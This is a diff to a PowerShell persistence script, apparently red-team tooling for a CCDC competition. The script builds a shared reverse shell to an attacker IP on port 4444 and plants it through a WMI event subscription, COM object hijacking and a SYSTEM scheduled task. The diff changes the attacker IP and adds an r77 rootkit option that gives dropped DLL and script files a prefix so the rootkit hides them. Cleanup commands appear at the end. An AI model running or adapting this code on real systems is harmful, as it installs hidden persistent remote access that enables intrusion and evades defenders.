@@ -62,7 +62,7 @@
 #Requires -RunAsAdministrator
 
 param(
-    [string]$AttackerIP   = "10.0.0.1",
+    [string]$AttackerIP   = "172.31.40.6",
     [int]   $AttackerPort = 4444
 )
 
@@ -80,6 +80,15 @@ Write-Warn "================================================================"
 Write-Warn " CCDC Phase 3 — Persistence: Ghost In The WMI"
 Write-Warn "================================================================"
 Write-Host ""
+
+# ── r77 rootkit mode ──────────────────────────────────────────────────────────
+$r77Answer  = Read-Host "Is the r77 rootkit active? Prefix dropped files with `$77 to hide them? (y/N)"
+$HidePrefix = if ($r77Answer -match '^[Yy]') { '$77' } else { '' }
+if ($HidePrefix) {
+    Write-Warn "r77 mode ENABLED — dropped files will be prefixed: $HidePrefix"
+} else {
+    Write-Info "r77 mode: disabled"
+}
 
 # ── Shared Payload — built once, embedded in all three mechanisms ───────────────
 Write-Section "Building shared reverse-shell payload"
@@ -157,7 +166,7 @@ try {
 Write-Section "MECHANISM 2 — COM Object Hijacking (T1546.015)"
 
 $comClsid   = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
-$comDllPath = "C:\Windows\Temp\wbemperf.dll"
+$comDllPath = "C:\Windows\Temp\${HidePrefix}wbemperf.dll"
 
 $comCsTemplate = @'
 using System;
@@ -254,7 +263,7 @@ if ($osProductType -le 1) {
     # Fallback: write encoded payload to a hidden .ps1 and register a SYSTEM-level
     # scheduled task (server-only, one-shot on boot) to achieve the same effect
     # without requiring a native DLL.
-    $fallbackScript = "$env:SystemRoot\System32\wbemperf_mon.ps1"
+    $fallbackScript = "$env:SystemRoot\System32\${HidePrefix}wbemperf_mon.ps1"
     $payloadBytes   = [System.Text.Encoding]::Unicode.GetBytes($payloadStr)
     $fallbackEncCmd = [Convert]::ToBase64String($payloadBytes)
 
@@ -303,7 +312,7 @@ Write-Info "  M1: Get-WmiObject -Namespace root/subscription -Class __EventFilte
 Write-Info "        Filter: WMIProviderHostCompatibility"
 Write-Info "      Remove-WmiObject on filter + consumer (WBEM_SyncHandler) + binding"
 Write-Info "  M2: Remove HKCU:\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}"
-Write-Info "      Delete C:\Windows\Temp\wbemperf.dll"
+Write-Info "      Delete C:\Windows\Temp\$($HidePrefix)wbemperf.dll"
 Write-Info "  M3: Unregister-ScheduledTask -TaskName WMIPerfCounterMonitor -Confirm:`$false"
 Write-Info "      Remove HKLM:\...\Control\Print\Monitors\WMIPerfCounterMonitor"
-Write-Info "      Delete `$env:SystemRoot\System32\wbemperf_mon.ps1"
+Write-Info "      Delete `$env:SystemRoot\System32\$($HidePrefix)wbemperf_mon.ps1"
